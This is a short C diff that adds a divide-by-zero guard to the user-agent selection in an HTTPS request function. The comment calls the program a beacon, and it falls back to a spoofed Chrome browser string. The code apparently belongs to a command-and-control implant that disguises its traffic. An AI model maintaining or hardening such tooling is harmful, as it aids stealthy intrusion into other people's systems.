@@ -374,8 +374,16 @@ http_response_t https_request(const bsb_config_t *cfg, const char *url, const ch
 
     struct MemoryStruct chunk = {0};
     curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_USERAGENT,
-                     cfg->network.user_agents[rand() % cfg->network.count]);
+    /* Guard the UA pick: an empty network.user_agents list would make
+     * rand() % 0 raise SIGFPE and kill the beacon. Fall back to a
+     * neutral default instead. */
+    if (cfg->network.count > 0 && cfg->network.user_agents[0][0] != '\0')
+        curl_easy_setopt(curl, CURLOPT_USERAGENT,
+                         cfg->network.user_agents[rand() % cfg->network.count]);
+    else
+        curl_easy_setopt(curl, CURLOPT_USERAGENT,
+                         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+                         " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, (long)cfg->network.verify_tls);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, (long)(cfg->network.verify_tls ? 2L : 0L));
 
